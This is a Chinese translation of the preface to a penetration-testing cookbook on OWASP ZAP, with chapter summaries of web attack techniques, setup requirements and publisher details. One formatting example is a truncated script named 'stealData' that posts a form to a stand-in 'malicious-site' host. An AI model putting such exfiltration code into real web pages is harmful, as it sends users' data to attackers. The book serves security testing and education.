# 前言

欢迎来到开放 Web 应用程序安全项目 Zed 攻击代理（OWASP ZAP）的世界，这是一款强大且多功能的 Web 应用程序安全测试工具。OWASP `ZAP`，即 **Zed 攻击代理**，是由 **开放 Web 应用程序安全项目**（**OWASP**）社区开发的开源工具。它于 2010 年首次发布，并且自那时以来，已成为全球最受欢迎和广泛使用的 Web 应用程序安全测试工具之一。

OWASP ZAP 旨在帮助安全专家和黑客识别和利用 Web 应用程序中的漏洞。它既可以用于自动化测试，也可以用于手动测试，是一个多功能工具，可以根据任何组织的需求进行定制。该工具的特点包括易于使用的界面、广泛的内置安全检查以及与其他安全工具的集成能力。

OWASP ZAP 的一个关键优点是它的开源特性。这意味着该工具由 OWASP 社区不断更新和改进，使其成为最全面、最先进的 Web 应用程序安全测试工具之一。此外，背后有一个庞大且活跃的社区，这意味着有大量资源可以帮助用户最大限度地利用该工具。

本书将深入探讨 OWASP ZAP 的功能和能力，提供使用该工具识别和利用 Web 应用程序漏洞的全面指南。无论您是安全专家、开发人员还是黑客，本书都将为您提供有效使用 OWASP ZAP 来保护 Web 应用程序所需的知识和技能。

总之，OWASP ZAP 是一个强大而多功能的工具，任何希望识别和利用 Web 应用程序漏洞的人都可以使用它。凭借其开源特性、活跃的社区和一系列内置安全检查，它是保护 Web 应用程序的绝佳选择。

# 本书适用对象

OWASP ZAP 主要面向 Web 应用程序安全专家、开发人员、教育工作者和黑客。它是一个强大的工具，可用于识别和利用 Web 应用程序中的漏洞，是任何负责 Web 系统安全的人必不可少的工具。

值得注意的是，虽然 OWASP ZAP 可以用来识别和利用漏洞，但它并非用于执行恶意攻击或未经许可破坏系统。该工具旨在帮助组织识别并修复 Web 应用程序中的漏洞，而不是促进未经授权的访问或其他恶意活动。因此，使用该工具的用户必须理解并遵守道德黑客原则。

# 本书内容

*第一章*，*开始使用 OWASP Zed 攻击代理*，向你介绍了 ZAP，它在 OWASP 组织中的维护情况、在渗透测试中的作用，以及如何在各种平台上安装和配置它，设置基本的实验室环境，并使用它进行测试。

*第二章*，*浏览用户界面*，解释了如何在 ZAP 中定位并使用各种窗口、工具和功能来进行渗透测试，例如设置目标、手动探索应用程序、修改响应以及使用有效载荷测试特定参数。

*第三章*，*配置、爬取、扫描与报告*，教你如何配置和使用 ZAP 的爬取、扫描和报告功能，了解这些部分如何工作，设置项目设置以评估应用程序，并自定义用户选项以获得个性化体验。

*第四章*，*认证与授权测试*，向你展示了如何测试和绕过认证与授权机制，包括拦截并使用默认凭证、绕过认证、测试默认凭证、利用目录遍历攻击、提升权限以及测试不安全的直接对象引用。

*第五章*，*会话管理测试*，教你如何操作控制和维持用户与应用交互状态的机制，涵盖了测试 cookie 属性、跨站请求伪造、利用登出功能和会话劫持等主题。

*第六章*，*验证（数据）输入 – 第一部分*，探讨了最常见的 Web 应用程序安全漏洞类型，如跨站脚本、HTTP 动词篡改、HTTP 参数污染和 SQL 注入，并介绍了如何使用 ZAP 来利用这些漏洞。

*第七章*，*验证（数据）输入 – 第二部分*，讨论了 Web 应用程序注入攻击的高级类型，如代码注入、命令注入、服务器端模板注入和服务器端请求伪造，并介绍了如何使用 ZAP 来利用这些攻击。

*第八章*，*业务逻辑测试*，深入探讨了在多功能动态 Web 应用程序中测试业务逻辑漏洞的非常规方法，包括伪造请求、测试过程时机、测试功能限制、绕过工作流，以及上传包含恶意负载的意外文件类型。

*第九章*，*客户端测试*，涵盖了客户端测试以及与之相关的攻击场景，例如 DOM 跨站脚本、JavaScript 执行、HTML 注入、URL 重定向攻击、跨域资源共享漏洞和 Web 套接字的利用。

*第十章*，*高级攻击技巧*，探讨了几种额外的高级攻击方法，例如执行 XXE、`Java Web Token`（**JWT**）的利用、Java 反序列化和 Web 缓存投毒。

*第十一章*，*与 ZAP 的高级冒险*，教你了解 ZAP 具有的其他功能和特性，例如通过本地 API 运行动态扫描、在 CI 流水线中作为动态扫描运行 ZAP，以及集成并使用内置的 OWASP 应用安全带外服务器进行测试。

# 获取本书最大收益

为了充分利用《Zed Attack Proxy Cookbook》，你应该保持信息更新并利用社区资源。OWASP ZAP 是一个开源工具，不断进行更新和改进，因此保持与最新版本同步非常重要。此外，OWASP 社区非常活跃，提供了许多资源，可以帮助你充分利用该工具。

| **本书中涵盖的软件/硬件** | **操作系统要求** |
| --- | --- |
| Java | Windows、macOS 或 Linux |
| Docker Desktop/Docker Compose | Windows、macOS 或 Linux |
| OWASP Juice-Shop | Windows、macOS、Linux 或 Docker |
| Mutillidae II | Windows、macOS 或 Linux |
| Jenkins | Windows、macOS、Linux 或 Docker |

**如果你使用的是本书的数字版，我们建议你自己输入代码，或者从本书的 GitHub 仓库获取代码（下一节有链接）。这样做有助于避免与复制粘贴代码相关的潜在错误。**

*此外，使用 ZAP，熟能生巧。ZAP 是一款旨在帮助组织识别和修复其 Web 应用程序漏洞的工具，在 Web 世界中，开发人员设计、构建和实现的各种方法和组合是无穷无尽的。通过实践，了解 Web 应用程序是如何构建的，只会让你成为一个更强大的 Web 应用程序渗透测试员* *使用 ZAP*。

# 下载示例代码文件

你可以从 GitHub 下载本书的示例代码文件，地址是：[`github.com/PacktPublishing/Zed-Attack-Proxy-Cookbook`](https://github.com/PacktPublishing/Zed-Attack-Proxy-Cookbook)。如果代码有更新，将会在 GitHub 仓库中进行更新。

我们还提供了其他来自我们丰富目录的代码捆绑包，包含书籍和视频，地址是：[`github.com/PacktPublishing/`](https://github.com/PacktPublishing/)。快来看看吧！

# 下载彩色图像

我们还提供了一份 PDF 文件，其中包含本书中使用的截图和图表的彩色图像。你可以在这里下载：[`packt.link/oBhpt`](https://packt.link/oBhpt)。

# 使用的约定

本书中使用了若干文本约定。

**文本中的代码**：表示文本中的代码字词、数据库表名、文件夹名称、文件名、文件扩展名、路径名、虚拟网址、用户输入和 Twitter 账户名。以下是一个示例：“将下载的 `WebStorm-10*.dmg` 磁盘映像文件挂载为系统中的另一个磁盘。”

一段代码的设置如下：

```
 pipeline {
   agent any
   parameters {
          choice(name: "ZAP_SCAN", choices: ["zap-baseline. py", "zap-full-scan.py"], description: "Parameter to choose type of ZAP scan")
string(name: "ENTER_
```

当我们希望引起你对代码块中特定部分的注意时，相关的行或项目会以粗体显示：

```
 <script>
    function stealData() {
       var form = document.createElement("form");
       form.setAttribute("method", "post");
       form.setAttribute("action", "http://malicious-site. com");
```

任何命令行输入或输出如下所示：

```
 docker pull bkimminich/juice-shop
```

**粗体**：表示一个新术语、重要词汇或屏幕上看到的词语。例如，菜单或对话框中的词语通常是 **粗体**。以下是一个示例：“从 **管理** 面板中选择 **系统信息**。”

提示或重要备注

看起来像这样。

# 章节

本书中有几个标题经常出现（*准备工作*、*如何操作…*、*它是如何工作的…*、*还有更多…*，以及*另见*）。

为了提供清晰的操作步骤，可以按照以下方式使用这些章节：

## 准备工作

本节告诉你在食谱中期望看到什么，并描述如何设置任何软件或进行任何食谱所需的初步设置。

## 如何操作…

本节包含执行食谱所需的步骤。

## 它是如何工作的…

本节通常详细解释前一节发生的情况。

## 还有更多…

本节包含有关该食谱的额外信息，以帮助你更好地理解该食谱。

## 另见

本节提供指向其他有用信息的链接，供食谱参考。

# 联系我们

我们始终欢迎读者的反馈。

**一般反馈**：如果你对本书的任何部分有疑问，请通过电子邮件联系我们：customercare@packtpub.com，并在邮件主题中注明书名。

**勘误**：尽管我们已经尽力确保内容的准确性，但仍然会有错误发生。如果你发现本书中的错误，我们将非常感激你向我们报告。请访问 [www.packtpub.com/support/errata](http://www.packtpub.com/support/errata) 并填写表格。

**盗版**：如果你在互联网上发现我们的作品存在任何形式的非法复制，我们将非常感激你提供相关的网址或网站名称。请通过 copyright@packt.com 与我们联系，并附上材料的链接。

**如果你有兴趣成为作者**：如果你在某个主题上拥有专长，并且有兴趣撰写或为一本书做贡献，请访问 [authors.packtpub.com](http://authors.packtpub.com)。

# 分享你的想法

阅读完 *Zed Attack Proxy Cookbook* 后，我们很乐意听到你的想法！请[点击这里直接访问该书的亚马逊评论页面](https://packt.link/r/1801817332)并分享你的反馈。

你的评价对我们和技术社区非常重要，将帮助我们确保提供高质量的内容。

# 下载这本书的免费 PDF 副本

感谢你购买这本书！

你喜欢在路上阅读，但又无法随身携带纸质书吗？你的电子书购买与选择的设备不兼容吗？

别担心，现在购买每本 Packt 书籍时，你将免费获得该书的无 DRM PDF 版本。

在任何地方、任何设备上都能阅读。直接从你最喜欢的技术书籍中搜索、复制并粘贴代码到你的应用程序中。

优惠不仅仅是这些，你还可以每天在收件箱中收到独家的折扣、新闻通讯和精彩的免费内容。

按照以下简单步骤获取福利：

1.  扫描二维码或访问以下链接

![](img/B18829_QR_Free_PDF.jpg)

[`packt.link/free-ebook/9781801817332`](https://packt.link/free-ebook/9781801817332)

1.  提交你的购买证明

1.  就是这样！我们会将你的免费 PDF 和其他福利直接发送到你的邮箱。
